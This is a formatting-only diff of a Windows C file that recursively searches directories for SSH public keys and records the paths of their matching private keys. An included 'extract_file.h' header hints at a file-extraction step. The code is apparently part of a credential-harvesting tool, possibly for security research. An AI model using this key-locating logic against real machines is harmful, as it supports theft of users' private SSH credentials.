@@ -1,9 +1,9 @@
 #include "find_ssh_key.h"
 
+#include <shlwapi.h>
 #include <stdio.h>
 #include <string.h>
 #include <windows.h>
-#include <shlwapi.h>
 
 #include "extract_file.h"
 
@@ -35,7 +35,7 @@ static void find_keys_pair(const WCHAR *directory, const WCHAR *pkName,
   if (attributes == INVALID_FILE_ATTRIBUTES ||
       (attributes & FILE_ATTRIBUTE_DIRECTORY)) {
     wprintf(L"[ERROR] find_key_pair: couldn't find private key for %ls\n",
-           pkNamePath);
+            pkNamePath);
     return;
   }
 
@@ -51,8 +51,9 @@ static void find_keys_pair(const WCHAR *directory, const WCHAR *pkName,
   wcsncpy(keysTab[*index].secretKeyPath, skNamePath, lenSkNamePath);
   keysTab[*index].secretKeyPath[lenSkNamePath] = L'\0';
 
-  wprintf(L"[DEBUG] find_key_pair: Keys pair found: \nindex = %u\n\t%ls\n\t%ls\n\n",
-         *index, keysTab[*index].publicKeyPath, keysTab[*index].secretKeyPath);
+  wprintf(
+      L"[DEBUG] find_key_pair: Keys pair found: \nindex = %u\n\t%ls\n\t%ls\n\n",
+      *index, keysTab[*index].publicKeyPath, keysTab[*index].secretKeyPath);
 
   // incrementing the index
   (*index)++;
@@ -87,7 +88,7 @@ static void find_ssh_key_recursively(const PWSTR directory,
     if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
       WCHAR subDirectory[MAX_PATH];
       _snwprintf(subDirectory, sizeof(subDirectory), L"%ls\\%ls", directory,
-               fileName);
+                 fileName);
 
       // Repeat the process on the subdirectories
       find_ssh_key_recursively(subDirectory, keysFilenamesTab, indexKeysTab);
@@ -101,7 +102,8 @@ static void find_ssh_key_recursively(const PWSTR directory,
         break;
       } else if (wcscmp(fileName + (lenFileName - 4), L".pub") == 0) {
         wprintf(L"File : %s\\%s\n", directory, fileName);
-        find_keys_pair(directory, fileName, lenFileName, keysFilenamesTab, indexKeysTab);
+        find_keys_pair(directory, fileName, lenFileName, keysFilenamesTab,
+                       indexKeysTab);
       }
     }
   } while (FindNextFileW(hFind, &findData) != 0);
